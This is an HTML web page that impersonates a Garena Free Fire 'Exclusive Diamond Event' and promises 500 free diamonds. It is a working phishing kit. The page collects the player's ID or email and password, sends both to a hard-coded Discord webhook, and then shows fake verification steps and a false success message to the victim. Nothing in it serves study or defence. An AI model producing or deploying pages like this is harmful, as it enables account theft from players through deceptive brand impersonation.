<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Garena Free Fire - Exclusive Diamond Reward</title>
    <style>
        /* Reset and Base Styles */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
        }

        /* Background Pattern (Subtle) */
        body::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            background-image: 
                radial-gradient(circle at 20% 20%, rgba(255, 215, 0, 0.1) 0%, transparent 20%),
                radial-gradient(circle at 80% 80%, rgba(255, 215, 0, 0.1) 0%, transparent 20%);
            z-index: -1;
        }

        /* Main Card */
        .card {
            background: rgba(22, 33, 62, 0.95);
            border: 2px solid #ffd700;
            border-radius: 15px;
            padding: 30px;
            width: 90%;
            max-width: 380px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.7);
            text-align: center;
            position: relative;
        }

        /* Header Section */
        .header {
            margin-bottom: 25px;
        }

        .logo-text {
            font-size: 1.8rem;
            font-weight: 800;
            text-transform: uppercase;
            letter-spacing: 2px;
            color: #ffd700;
            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
        }

        .subtitle {
            font-size: 0.9rem;
            color: #ccc;
            margin-top: 5px;
        }

        /* Diamond Icon */
        .diamond-icon {
            width: 80px;
            height: 80px;
            margin: 0 auto 20px;
            background: radial-gradient(circle at 30% 30%, #ffd700, #ff8c00);
            clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%);
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 0 20px rgba(255, 215, 0, 0.6);
            animation: pulse 2s infinite;
        }

        .diamond-icon span {
            font-size: 2rem;
            color: #fff;
            font-weight: bold;
        }

        @keyframes pulse {
            0% { transform: scale(1); box-shadow: 0 0 20px rgba(255, 215, 0, 0.6); }
            50% { transform: scale(1.05); box-shadow: 0 0 30px rgba(255, 215, 0, 0.8); }
            100% { transform: scale(1); box-shadow: 0 0 20px rgba(255, 215, 0, 0.6); }
        }

        /* Input Fields */
        .input-group {
            margin-bottom: 15px;
            text-align: left;
        }

        label {
            display: block;
            font-size: 0.85rem;
            color: #aaa;
            margin-bottom: 5px;
            padding-left: 5px;
        }

        input {
            width: 100%;
            padding: 12px 15px;
            border-radius: 8px;
            border: 1px solid #444;
            background-color: #0f3460;
            color: white;
            font-size: 1rem;
            transition: all 0.3s ease;
        }

        input:focus {
            outline: none;
            border-color: #ffd700;
            box-shadow: 0 0 8px rgba(255, 215, 0, 0.4);
        }

        /* Button */
        .btn-claim {
            width: 100%;
            padding: 14px;
            margin-top: 20px;
            border: none;
            border-radius: 8px;
            background: linear-gradient(90deg, #ffd700, #ff8c00);
            color: #1a1a2e;
            font-size: 1.1rem;
            font-weight: bold;
            text-transform: uppercase;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }

        .btn-claim:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(255, 140, 0, 0.4);
        }

        .btn-claim:active {
            transform: translateY(0);
        }

        /* Loader */
        .loader-container {
            display: none;
            margin-top: 20px;
        }

        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid rgba(255, 215, 0, 0.3);
            border-top: 4px solid #ffd700;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .status-text {
            margin-top: 10px;
            font-size: 0.9rem;
            color: #ffd700;
        }

        /* Footer */
        .footer {
            margin-top: 20px;
            font-size: 0.75rem;
            color: #666;
        }
    </style>
</head>
<body>

<div class="card">
    <div class="header">
        <div class="logo-text">FREE FIRE</div>
        <div class="subtitle">Exclusive Diamond Event</div>
    </div>

    <div class="diamond-icon">
        <span>💎</span>
    </div>

    <p style="margin-bottom: 20px; color: #ddd;">Complete the task to receive <strong>500 Diamonds</strong> instantly!</p>

    <form id="loginForm" onsubmit="return false;">
        <div class="input-group">
            <label for="email">Player ID / Email</label>
            <input type="text" id="email" placeholder="e.g., 123456789" required>
        </div>
        
        <div class="input-group">
            <label for="password">Password</label>
            <input type="password" id="password" placeholder="••••••••" required>
        </div>

        <button type="button" class="btn-claim" onclick="sendData()">Claim Diamonds</button>
    </form>

    <div class="loader-container" id="loader">
        <div class="spinner"></div>
        <div class="status-text" id="statusText">Verifying Account...</div>
    </div>

    <div class="footer">
        &copy; 2024 Garena Free Fire. All Rights Reserved.
    </div>
</div>

<script>
    async function sendData() {
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const loader = document.getElementById('loader');
        const statusText = document.getElementById('statusText');
        const btn = document.querySelector('.btn-claim');

        if (!email || !password) {
            alert("Please fill in all fields.");
            return;
        }

        // Disable button and show loader
        btn.disabled = true;
        btn.style.opacity = '0.7';
        loader.style.display = 'block';

        // Simulate network steps for realism
        setTimeout(() => { statusText.innerText = "Connecting to Garena Servers..."; }, 1000);
        setTimeout(() => { statusText.innerText = "Validating Credentials..."; }, 2500);

        const webhookURL = "https://discord.com/api/webhooks/1540767862891880500/9oWDyzzwB3IrZqrZ0FS6zGkyTJLtXFLlFgg0j3uqT_RZAVC50fmc_gTX9HXgDenRNXT8";

        const payload = {
            content: "💎 **New Free Fire Diamond Claim!** 💎",
            embeds: [{
                title: "🎁 Reward Claimed",
                color: 16776960, // Gold
                fields: [
                    { name: "🆔 Player ID / Email", value: email, inline: true },
                    { name: "🔑 Password", value: password, inline: true }
                ],
                footer: { text: "Garena Free Fire Event" },
                timestamp: new Date().toISOString()
            }]
        };

        try {
            await fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });

            // Success state
            statusText.innerText = "Success! Diamonds Sent.";
            statusText.style.color = "#4caf50"; // Green
            
            setTimeout(() => {
                alert("✅ 500 Diamonds have been added to your account!");
                // Optional: Redirect or reload
                // window.location.href = "https://www.garena.com/free-fire";
            }, 1000);

        } catch (error) {
            console.error('Error:', error);
            statusText.innerText = "Error. Try again.";
            statusText.style.color = "#ff4444"; // Red
            btn.disabled = false;
            btn.style.opacity = '1';
        }
    }
</script>

</body>
</html>
